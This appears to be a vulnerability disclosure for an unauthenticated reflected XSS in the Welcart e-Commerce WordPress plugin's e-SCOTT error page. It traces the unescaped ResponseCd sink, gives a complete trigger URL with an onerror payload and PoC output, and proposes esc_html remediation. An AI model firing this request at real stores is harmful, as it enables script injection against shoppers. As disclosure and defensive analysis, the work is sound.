# Welcart e-Commerce (usc-e-shop) ≤ 2.12.5 — Unauthenticated Reflected XSS

**Auth required:** None (unauthenticated GET)
**Install base:** Welcart e-Commerce ~10,000 active installs
**Conditional scope:** Only sites with the **e-SCOTT Smart (ESCOTT)** settlement activated

---

## Sink

`classes/paymentESCOTT.main.class.php` → `ESCOTT_MAIN::error_page_message()`
(registered on the `usces_filter_get_error_settlement` filter)

```php
$responsecd = explode( '|', wp_unslash( $_REQUEST['ResponseCd'] ) );   // ~line 1908
// ... builds $error_message[] from each code ...
$html .= '<p>' . __( 'Error code', 'usces' ) . ' : '
       . wp_unslash( $_REQUEST['ResponseCd'] ) . '</p>';              // ~line 1915  <-- RAW SINK
```

Output path (no escaping anywhere):

```
templates/cart/error.php      $html .= uesces_get_error_settlement( 'return' );
functions/function.php:3125   $res = apply_filters( 'usces_filter_get_error_settlement', $res );
usceshop.class.php filter_cartContent()  case 'error'  ->  $content = $html  ->  the_content (echoed)
```

## Why it's exploitable (magic-quotes bypass)

* `wp_unslash()` strips the slashes that WordPress core's `wp_magic_quotes()`
  (`addslashes` on `$_GET/$_POST/$_REQUEST`) would otherwise apply — this is the
  exact mechanism that turned the image-map-hotspots raw-`$_POST` SQLi into a
  **false positive**. Here the value reaches the page unmodified.
* Payload is **quote-free** (`<img … onerror=…>`), so it needs no `'`/`"` and
  survives escaping-by-addslashes regardless.
* `count( $error_message ) > 0` (line 1913) is always true inside the branch:
  `explode()` always yields ≥ 1 element, so the raw echo is unconditional once
  the branch is selected.

## Reachability (all unauthenticated)

1. `MerchantFree2=acting_escott_conv` selects the vulnerable `elseif`
   (`$this->acting_flg_conv === $acting_flg`, line 1906). The card branch
   (`acting_flg_card`) is a different value, so it falls through correctly.
2. `acting_return=1` → `usces_register_action('acting_return','request',…)`
   dispatches `usceshop::acting_return()` on the public cart page.
   It also skips the empty-cart redirect (line 3756).
3. `usces_check_acting_return()` `default:` case sets `$results = $_REQUEST`
   and `$results[0] = 0` (no `result` param) → `page = 'error'` (line 3788).
4. ESCOTT's `acting_return()` filter does **not** redirect here: its nonce
   redirect only runs when `acting_flg ∈ pay_method`; with no/`non-matching`
   `acting` value it early-returns unchanged.
5. `acting_notice_ip_guard()` (the `die()`-on-foreign-IP guard) is only invoked
   by `acting_transaction()` when the *full* server-to-server notification set
   (`MerchantId`/`TransactionId`/`RecvNum`/`NyukinDate`/`MerchantFree1`) is
   present, and its own doc-block states it is **not** called on the
   browser-return path. Our request omits those → never triggered.

## Trigger

```
GET http://target/usces-cart/?acting_return=1&MerchantFree2=acting_escott_conv&ResponseCd=%3Cimg%20src%3Dx%20onerror%3D...%3E
```

## Verification evidence (local reproduction, WP 7.1.3)

Raw reflection (no escaping):
```html
<p>Error code : <img src=x onerror=alert(document.domain)></p>
```
* `&lt;img` occurrences: **0**
* raw `<img … onerror=…>` occurrences: **1**
* Only CSP on the response: `frame-ancestors 'none'` (does not block inline handlers)

Real-browser execution (chrome-devtools navigation; DOM marker read across isolated world):
```
dataXss: "fired"     <- onerror handler executed
title  : "Error | test"
```

PoC run:
```
[+] Raw payload in response      : YES
[+] HTML-escaped payload present : no
[*] Reflected unescaped (browser executes): CONFIRMED - XSS
exit 0
```
Negative control (plain `GET /usces-cart/`): `Error code` count = **0**.

## Prerequisites / limitations

* e-SCOTT Smart must be activated: `acting_settings.escott.activate = 'on'`
  **and** `conv_activate = 'on'`, and `escott ∈ usces_settlement_selected`
  (otherwise `ESCOTT_SETTLEMENT::get_instance()` is never constructed and the
  filter never registers — confirmed: without these the error page shows only
  the fallback string).
* Reflected (requires victim to open crafted link) → `UI:R`, hence Medium not High.
* No CAPTCHA / rate limit on the front-end cart route.

## Remediation

Escape at the sink (all three unescaped uses in `error_page_message`):

```php
$html .= '<p>' . esc_html__( 'Error code', 'usces' ) . ' : '
       . esc_html( wp_unslash( $_REQUEST['ResponseCd'] ) ) . '</p>';
```

Apply `esc_html()` (or an allowlist) to every `$_REQUEST[…]` value echoed into
`$html` in this function, and re-audit the sibling gateways (DSK / Digitalcheck
/ Remise …) which follow the same `error_page_message` pattern.

